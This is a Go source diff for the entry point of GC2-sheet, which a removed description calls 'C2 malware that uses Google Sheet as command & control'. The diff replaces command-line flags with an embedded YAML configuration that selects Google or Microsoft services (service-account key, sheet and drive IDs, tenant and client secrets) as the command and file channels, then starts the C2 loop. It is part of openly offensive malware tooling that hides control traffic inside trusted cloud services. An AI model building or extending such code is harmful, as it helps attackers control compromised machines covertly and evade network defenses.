@@ -5,83 +5,65 @@ import (
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
 	_ "embed"
+	"log"
 	"net/url"
-	"os"
 
-	"github.com/spf13/cobra"
 	"gopkg.in/yaml.v2"
 )
 
 var (
-	credentialFlag string
-	sheetIdFlag    string
-	driveIdFlag    string
-	debugFlag      bool
 	//go:embed options.yml
 	configurationFileContent []byte
 )
 
-var rootCmd = &cobra.Command{
-	Use:   "gc2-sheet",
-	Short: "gc2-sheet new C2 malware that uses Google Sheet as command & control.",
-	Long:  `gc2-sheet new C2 malware that uses Google Sheet as command & control.`,
-	Run: func(cmd *cobra.Command, args []string) {
-
-		// If flags have not been used, get the configuration file
-		if credentialFlag == "" || sheetIdFlag == "" || driveIdFlag == "" {
-
-			configurationFile := configuration.ConfigurationFile{}
-
-			yaml.Unmarshal(configurationFileContent, &configurationFile)
-
-			proxyUrl, err := url.Parse(configurationFile.Proxy)
-
-			if err != nil {
-				utils.LogFatalDebug("Proxy string invalid")
-			}
-
-			if configurationFile.Proxy == "" {
-				proxyUrl = nil
-			}
-
-			configuration.SetOptions(configurationFile.Key, configurationFile.Sheet, configurationFile.Drive, proxyUrl, configurationFile.Verbose)
-
-			utils.LogDebug("Using configuration file")
-		} else { // Using standard flags
-			var key []byte
-
-			if credentialFlag != "" {
-				var err error
-				key, err = os.ReadFile(credentialFlag)
-				if err != nil {
-					utils.LogFatalDebug("Key file not found")
-				}
-			}
-			configuration.SetOptions(string(key), sheetIdFlag, driveIdFlag, nil, debugFlag)
-			utils.LogDebug("Using flags")
-		}
-
-		C2.C2Init()
-
-	},
-}
-
-func init() {
-
-	cobra.MousetrapHelpText = ""
-
-	rootCmd.Flags().StringVarP(&credentialFlag, "key", "k", "", "GCP service account credential in JSON")
-
-	rootCmd.Flags().StringVarP(&sheetIdFlag, "sheet", "s", "", "Google sheet ID")
-
-	rootCmd.Flags().StringVarP(&driveIdFlag, "drive", "d", "", "Google drive ID")
-
-	rootCmd.Flags().BoolVarP(&debugFlag, "verbose", "v", false, "Enable verbose output")
+type ConfigurationFile struct {
+	CommandService          string `yaml:"CommandService"`
+	FileSystemService       string `yaml:"FileSystemService"`
+	GoogleServiceAccountKey string `yaml:"GoogleServiceAccountKey"`
+	GoogleSheetID           string `yaml:"GoogleSheetID"`
+	GoogleDriveID           string `yaml:"GoogleDriveID"`
+	MicrosoftTenantID       string `yaml:"MicrosoftTenantID"`
+	MicrosoftClientID       string `yaml:"MicrosoftClientID"`
+	MicrosoftClientSecret   string `yaml:"MicrosoftClientSecret"`
+	MicrosoftSiteID         string `yaml:"MicrosoftSiteID"`
+	RowId                   int    `yaml:"RowId"`
+	Proxy                   string `yaml:"Proxy"`
+	Verbose                 bool   `yaml:"Verbose"`
 }
 
 func Execute() {
-	if err := rootCmd.Execute(); err != nil {
 
-		os.Exit(1)
+	configurationFile := ConfigurationFile{
+		CommandService:        configuration.Google.String(),
+		FileSystemService:     configuration.Google.String(),
+		MicrosoftTenantID:     "",
+		MicrosoftClientID:     "",
+		MicrosoftClientSecret: "",
+		MicrosoftSiteID:       "",
+		RowId:                 1,
+		Proxy:                 "",
+		Verbose:               false,
 	}
+
+	yaml.Unmarshal(configurationFileContent, &configurationFile)
+
+	proxyUrl, err := url.Parse(configurationFile.Proxy)
+
+	if err != nil {
+		utils.LogFatalDebug("Proxy string invalid")
+	}
+
+	if configurationFile.Proxy == "" {
+		proxyUrl = nil
+	}
+
+	if (configurationFile.CommandService != configuration.Microsoft.String() && configurationFile.CommandService != configuration.Google.String()) || (configurationFile.FileSystemService != configuration.Microsoft.String() && configurationFile.FileSystemService != configuration.Google.String()) {
+		log.Fatal("CommandService and FileSystemService can be only Google or Microsoft (combination is possible)")
+	}
+
+	configuration.SetOptions(configurationFile.CommandService, configurationFile.FileSystemService, configurationFile.GoogleServiceAccountKey, configurationFile.GoogleSheetID, configurationFile.GoogleDriveID, configurationFile.MicrosoftTenantID, configurationFile.MicrosoftClientID, configurationFile.MicrosoftClientSecret, configurationFile.MicrosoftSiteID, configurationFile.RowId, proxyUrl, configurationFile.Verbose)
+
+	utils.LogDebug("Using configuration file")
+
+	C2.Run()
 }
